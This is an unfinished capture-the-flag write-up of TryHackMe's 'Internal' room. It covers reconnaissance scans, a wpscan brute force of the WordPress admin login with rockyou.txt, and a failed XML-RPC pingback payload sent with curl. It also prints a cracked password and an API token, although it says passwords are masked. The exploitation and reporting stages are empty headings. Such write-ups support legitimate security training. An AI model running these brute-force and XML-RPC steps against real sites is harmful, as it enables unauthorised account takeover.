---
title: "Internal.sh"
date: 2020-09-16T18:30:35-04:00
draft: true
toc: true
featured: true
summary: "You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks."
images:
  - "img/internal_cover.png"
cover: "img/internal_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
---

# Internal - THM Room

This is another writeup, this time for TryhackMe's 'Internal' room that is part of the Offensive Pentesting path. This is a writeup detailing all my process to root this room, flaws and all. I embrace mistakes and try to learn from them, therefore this post also includes my failed attempts. You have been warned :)

Leave a comment, leave your feedback or suggestions. It's all welcome, Have a great day!

Enjoy!

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/internal).
- **PLEASE NOTE:** Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors, and all. They are usually long :laughing:

PS: I been really busy at work these past days and seems to it'll be the same for the next few weeks. That being said, I still owe you (me? yep) the pentesting report for the last room we solved called [Relevant](https://www.tzero86bits.tk/posts/relevant/). I'd like to also work on the report for this one, so in all fairness I'll owe you two. Will try to get those done relatively soon. I promise. :smile:

## Stage 1 - Pre-engagement Interactions

> "One over-looked step to penetration testing is pre-engagement interactions or scoping. During this pre-phase, a penetration testing company will outline the logistics of the test, expectations, legal implications, objectives and goals the customer would like to achieve."


The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

  - User.txt
  - Root.txt

Additionally, the client has provided the following scope allowances:

  - Ensure that you modify your `hosts` file to reflect `internal.thm`
  - Any tools or techniques are permitted in this engagement
  - Locate and note all vulnerabilities found
  - Submit the flags discovered to the dashboard
  - Only the IP address assigned to your machine is in scope

## Stage 2 - Reconnaissance

> "Reconnaissance or Open Source Intelligence (OSINT) gathering is an important first step in penetration testing. A pentester works on gathering as much intelligence on your organization and the potential targets for exploit." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_


We need to make sure we update our `hosts` file with the domain for this target machine. For that we simply run nano as sudo and update the file as follows:

![We update the hosts file](https://i.imgur.com/WRwyePT.png)

And to verify we are good to go we perform a `ping` on `internal.thm`:

```sh
┌──(kali㉿kali)-[~]
└─$ ping internal.thm
PING internal.thm (10.10.254.102) 56(84) bytes of data.
64 bytes from internal.thm (10.10.254.102): icmp_seq=1 ttl=61 time=365 ms
64 bytes from internal.thm (10.10.254.102): icmp_seq=2 ttl=61 time=365 ms
64 bytes from internal.thm (10.10.254.102): icmp_seq=3 ttl=61 time=364 ms

```
We are good to go.


Let's run some scans. I'm gonna try `autorecon` and leave it running in the background while I continue with some other manual scans.

While that's running let's see if the machine has anything on port `80` being served for us:

![Default apache2 page on port 80](https://i.imgur.com/KaR0bj4.png)

That's a good piece of information. Let's move on.

If we check the `nmap quick` scan results from the ongoing `autorecon` scan, we see there is a port `22` open as well. This port is running `OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)` and we also get public key back:

![nmap quick results](https://i.imgur.com/rD5ZPzS.png)

Notice the nice folder structure generated by `autorecon`, all the information is organized into folders and there is even a folder to save the exploits you find or create for the target. In this case we can see the `scans` folder which contains the logs or reports of all the tools that are being triggered by `autorecon`, including the `nmap quick` scan that revealed the ssh service running on port `22`.

Let's take a look at what `gobuster` has found:

![Gobuster results](https://i.imgur.com/Rz8GETM.png)

I see some interesting directories here: `/blog`, `/phpmyadmin` and `/wordpress`. This is good information that we can use later on to try and find some vulnerabilities to get a foothold on this machine.

If we look at `/blog` we get this: 

![there is a blog](https://i.imgur.com/2AzqzEl.png)

With this we can say for sure, there is an active blog that runs `wordpress` as CMS. If we try to see the author of the only post published, we get a possible username: `admin`:

![Possible username](https://i.imgur.com/fgj9m77.png)


If try to access wordpress' default location for the admin panel `/wp-admin` we do get a login form:

![Admin panel at default location](https://i.imgur.com/834IhbN.png)

This is good as we could potentially try to hack our way in later on.
Let's look into `whatweb` results logged by `autorecon` to the `scans` folder.

There is not much to it, but we do get a specific version for the Apache server running: `Summary   : Apache[2.4.29], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)`.

`Nikto` scan did not throw much information that we didn't already know or even guessed at this point:

![nikto results](https://i.imgur.com/Qhhmh2b.png)

Let's take a look at that `/phpmyadmin`:

![PHPmyadmin login panel](https://i.imgur.com/9FIDR5Q.png)

We do get a login form. Interesting.

Lastly if we look at what's being served at `/wordpress` we get this:

![We get a normal wordpress empty page](https://i.imgur.com/pvLdvBw.png)

Let's see what results we get from nmap `UDP` scan:

![nmap UDP results](https://i.imgur.com/2egOwcg.png)

I see a couple of opened filtered ports there and not much more honestly. Since we know there is a wordpress blog there, we can run a `wpscan` to see if we could get some details on that wordpress install.

It is required now to obtain a free `wpvulndb API key` to get possible vulnerabilities details, check how to get your key [here](https://wpvulndb.com/api).

```sh
┌──(kali㉿kali)-[~]
└─$ wpscan --url internal.thm/blog --api-token YOP161Z4Cv0GA1Hi3zzisdtzcSzzfbvpVVpHTzj7eFCeho
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.245.144]
[+] Started: Thu Sep 17 22:06:58 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <===========================================================================> (21 / 21) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[+] WPVulnDB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 46

[+] Finished: Thu Sep 17 22:07:15 2020
[+] Requests Done: 54
[+] Cached Requests: 5
[+] Data Sent: 12.05 KB
[+] Data Received: 298.702 KB
[+] Memory used: 174.23 MB
[+] Elapsed time: 00:00:17


```
The most interesting thing about this is this line here `XML-RPC seems to be enabled`. This could lead us to a potential exploitation.


### Summary of findings so far

Let's sum up all the information we have obstained so far:

- Open Ports:
  - Port 80: Wordpress blog(default admin panel `/wp-admin` and possible `admin` username and `XML-RPC enabled http://internal.thm/blog/xmlrpc.php`).
  - Port 22: SSH running OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0).
  - UDP Ports: `68` and `631` are displayed as `open|filtered`.
- Keys/Hashes:
  - Public SSH Key: `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5`
- Software Versions:
  - Apache Server: Apache[2.4.29], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu).
  - PHPMyadmin: PHPMyAdmin login form accessible at `/phpmyadmin`.







## Stage 3 - Threat Modeling & Vulnerability Identification

> "During the threat modeling and vulnerability identification phase, the tester identifies targets and maps the attack vectors. Any information gathered during the Reconnaissance phase is used to inform the method of attack during the penetration test." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_


### Wordpress Login - Bruteforce


We have a possible username for wordpress called `admin`, we can try to attempt some brutefocing with `wpscan` to see if we manage to get past wordpress login form.

We fire up `wpscan` like this:

`wpscan --url internal.thm/blog/ --passwords rockyou.txt --usernames admin`

After a while we get something back:

```sh
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                             
Trying admin / lizzy Time: 00:10:20 <                                                                          > (3885 / 14348277)  0.02%  ETA: ??:??:??
                                                                                                                                                        
[!] Valid Combinations Found:                                                                                                                           
 | Username: admin, Password: my2boys
```
if we try to log into wodpress admin panel with those credentials, we do get access:

![we get access wordpress admin panel](https://i.imgur.com/LWGrDUt.png)

From here on we can potentially try to gain access in a couple of ways, the one I'm familiar is with trying to upload/modify a certain file that can give us a reverse shell connection. Let's see if we can manage to do that.

> At this point another piece of information from the `wpscan` results came to my attention. There was a mention of an outdated theme. I know there are theme vulnerabilities out there, that could be another way in. We'll have that in mind.



### XML-RPC

> XML-RPC is an API that warps the information or data into XML file and sends it to the mobile app or remote software. This was introduced as in the olden days, internet speed is not fast, instead of writing it online. Users writes their content offline and publish all together using the API. As the internet services improved, most of us does not use the feature anymore, often it was forgotten by us. _from [Cipher.com](hhttps://bsderek.home.blog/2020/01/06/exploiting-the-xmlrpc-php/)_


Let's start with the possible attacks against `XML-RPC enabled` in the installed Wordpress version.

The idea here is simple at least for this first attempt, we'll create a simple `XML` file that will ping back to us

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>http://10.13.0.34:8080</string>
  </value>
 </param>
 <param>
  <value>
   <string>http://internal.thm/blog/index.php/2020/08/03/hello-world/</string>
  </value>
 </param>
</params>
</methodCall>
```
We save this file as `pingback.xml`. Then we just need two more things. First, we need to launch an `nc -nlvp 8080` to start listening. Second, we need to execute this attack by running:

`curl -X POST -d @pingback.xml http://internal.thm/blog/xmlrpc.php`

Sadly this approach does not seem to work as I get:

```sh
┌──(kali㉿kali)-[~/Documents/THM/internal]
└─$ curl -X POST -d @pingback.xml http://internal.thm/blog/xmlrpc.php
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>0</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string></string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```


## Stage 4 - Exploitation

> "With a map of all possible vulnerabilities and entry points, the pentester begins to test the exploits found within your network, applications, and data. The goal is for the ethical hacker is to see exactly how far they can get into your environment, identify high-value targets, and avoid any detection." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_


## Stage 5 - Post-Exploitation, Risk Analysis & Recommendations

> "After the exploitation phase is complete, the goal is to document the methods used to gain access to your organization’s valuable information. The penetration tester should be able to determine the value of the compromised systems and any value associated with the sensitive data captured." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_

## Stage 6 - Reporting

> "Reporting is often regarded as the most critical aspect of a pentest. It’s where you will obtain written recommendations from the penetration testing company and have an opportunity to review the findings from the report with the ethical hacker(s)." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_

